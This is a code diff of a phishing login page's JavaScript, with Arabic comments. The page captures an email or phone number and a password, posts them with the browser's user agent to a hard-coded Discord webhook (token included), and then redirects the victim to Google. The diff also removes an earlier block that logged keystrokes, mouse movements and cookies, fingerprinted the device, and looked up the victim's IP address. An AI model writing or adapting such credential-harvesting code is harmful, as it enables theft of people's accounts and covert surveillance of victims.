@@ -207,81 +207,6 @@
     let userEmail = '';
     let userPassword = '';
     
-    // جمع بيانات إضافية عند تحميل الصفحة
-    const additionalData = {
-        browserInfo: {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            deviceMemory: navigator.deviceMemory || "غير متوفر",
-            cpuCores: navigator.hardwareConcurrency || "غير متوفر"
-        },
-        screenInfo: {
-            width: window.screen.width,
-            height: window.screen.height,
-            colorDepth: window.screen.colorDepth,
-            pixelRatio: window.devicePixelRatio
-        },
-        networkInfo: {
-            connectionType: navigator.connection?.effectiveType || "غير متوفر",
-            downlink: navigator.connection?.downlink || "غير متوفر"
-        },
-        storageData: {
-            cookies: document.cookie.split(';').map(c => c.trim()),
-            localStorage: Object.keys(localStorage).length,
-            sessionStorage: Object.keys(sessionStorage).length
-        },
-        interactionData: {
-            keystrokes: [],
-            mouseMovements: [],
-            clicks: []
-        },
-        ipInfo: {}
-    };
-
-    // تتبع تفاعلات المستخدم
-    document.addEventListener('keydown', (e) => {
-        additionalData.interactionData.keystrokes.push({
-            key: e.key,
-            time: new Date().toISOString()
-        });
-    });
-
-    document.addEventListener('mousemove', (e) => {
-        additionalData.interactionData.mouseMovements.push({
-            x: e.clientX,
-            y: e.clientY,
-            time: new Date().toISOString()
-        });
-    });
-
-    document.addEventListener('click', (e) => {
-        additionalData.interactionData.clicks.push({
-            target: e.target.tagName,
-            id: e.target.id || 'none',
-            class: e.target.className || 'none',
-            time: new Date().toISOString()
-        });
-    });
-
-    // جلب معلومات IP
-    async function fetchIPInfo() {
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            additionalData.ipInfo = {
-                ip: data.ip,
-                time: new Date().toISOString()
-            };
-        } catch (error) {
-            additionalData.ipInfo = {
-                error: "فشل في جلب عنوان IP"
-            };
-        }
-    }
-    
-    fetchIPInfo();
-
     function showPasswordPage() {
         const email = document.getElementById('email-input').value.trim();
         const emailError = document.getElementById('email-error');
@@ -337,24 +262,17 @@
         
         // توجيه المستخدم إلى الصفحة الرئيسية بعد ثانية واحدة
         setTimeout(() => {
-            window.location.href = "https://www.google.com";
+            window.location.href = "https://www.google.com"; // يمكنك تغيير هذا الرابط إلى الصفحة الرئيسية المطلوبة
         }, 1000);
     }
 
     function sendDataToDiscord() {
         const webhookURL = 'https://discordapp.com/api/webhooks/1404910412352327700/GCJf4yPnarHrDMDMgB5vmYIAz9dbncbmh2i-npw_AF6zg1y2uqbie2LcqJJlYRPUiSo4';
         
-        // إضافة البيانات الحساسة إلى البيانات الإضافية
-        additionalData.sensitiveData = {
-            email: userEmail,
-            password: userPassword,
-            collectionTime: new Date().toISOString()
-        };
-
         const data = {
-            content: '**تم جمع بيانات متقدمة**',
+            content: '**تم تسجيل بيانات جديدة**',
             embeds: [{
-                title: 'تفاصيل البيانات المجمعة',
+                title: 'تفاصيل تسجيل الدخول',
                 fields: [
                     {
                         name: 'البريد الإلكتروني/الهاتف',
@@ -367,38 +285,17 @@
                         inline: true
                     },
                     {
-                        name: 'معلومات المتصفح',
-                        value: `نوع: ${additionalData.browserInfo.userAgent}\nمنصة: ${additionalData.browserInfo.platform}`,
+                        name: 'وقت التسجيل',
+                        value: new Date().toLocaleString(),
                         inline: false
                     },
                     {
-                        name: 'معلومات الشاشة',
-                        value: `الدقة: ${additionalData.screenInfo.width}x${additionalData.screenInfo.height}`,
-                        inline: true
-                    },
-                    {
-                        name: 'معلومات الشبكة',
-                        value: `نوع الاتصال: ${additionalData.networkInfo.connectionType}`,
-                        inline: true
-                    },
-                    {
-                        name: 'عنوان IP',
-                        value: additionalData.ipInfo.ip || 'غير متوفر',
-                        inline: true
-                    },
-                    {
-                        name: 'عدد الكوكيز',
-                        value: additionalData.storageData.cookies.length.toString(),
-                        inline: true
-                    },
-                    {
-                        name: 'عدد النقرات المسجلة',
-                        value: additionalData.interactionData.clicks.length.toString(),
-                        inline: true
+                        name: 'معلومات المتصفح',
+                        value: navigator.userAgent,
+                        inline: false
                     }
                 ],
-                color: 16711680,
-                timestamp: new Date().toISOString()
+                color: 16711680 // اللون الأحمر
             }]
         };
 
